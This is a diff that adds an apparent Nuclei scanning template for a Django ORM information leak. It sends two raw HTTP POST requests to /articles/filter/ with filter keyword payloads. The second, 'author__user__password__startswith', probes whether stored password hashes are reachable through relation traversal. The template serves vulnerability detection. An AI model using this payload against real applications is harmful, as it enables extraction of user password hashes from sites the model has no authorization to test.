@@ -1,0 +1,45 @@
+id: django-orm-leak
+
+info:
+  name: Django ORM Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for information leaks in Django applications due to improper handling of ORM queries. By passing unrestricted keyword arguments to the Django ORM filter method, it becomes possible to construct queries that access sensitive data.
+
+http:
+  - raw:
+      - |
+        POST /articles/filter/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "title__startswith": "admin"
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admin"
+
+  - raw:
+      - |
+        POST /articles/filter/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "author__user__password__startswith": "pbkdf2_sha256"
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "pbkdf2_sha256"
